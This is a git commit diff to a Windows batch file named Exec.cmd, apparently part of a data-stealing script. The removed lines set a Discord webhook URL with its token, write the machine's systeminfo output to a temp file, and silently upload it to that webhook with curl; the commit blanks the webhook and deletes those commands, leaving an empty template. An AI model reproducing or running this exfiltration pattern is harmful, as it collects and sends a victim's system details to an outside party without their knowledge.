e31e090f029af4d54e0aa3c802bc4f770430ae4c
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-17 23:33:17 +0300

    Update Exec.cmd

--- Exec.cmd
+++ Exec.cmd
@@ -3,9 +3,8 @@
 title z%random%
 cd %temp%
 
-set webhook=https://discordapp.com/api/webhooks/1029420421134680064/O3e1_ivqQexrC5xDMF-5ne9hsrcZhyw561covq0STMU2hprO2ONNy5Ur03RSPSb5k_5h
+set webhook=
 
 :Commands
-systeminfo > output.txt
-curl --silent --output /dev/null -F save.dat=@"output.txt" %webhook%
+
 pause
